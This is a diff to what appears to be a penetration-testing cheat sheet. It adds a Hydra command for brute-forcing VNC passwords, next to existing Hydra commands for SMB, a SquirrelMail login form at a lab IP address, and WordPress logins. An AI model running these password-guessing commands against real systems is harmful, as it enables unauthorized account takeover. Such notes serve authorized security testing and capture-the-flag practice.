@@ -86,6 +86,11 @@ hydra -L users.txt -P <Password List> <Target Host> smb
 hydra -l <username> -P log1.txt 10.10.34.188 http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
 ```
 
+##### VNC
+```bash
+hydra -P <Password List> vnc://<Target Host> -V -f -t 4
+```
+
 ##### WordPress (HTTP Form Post)
 ```bash
 hydra -f -l <username> -P <Password List> <Target Host> -V http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
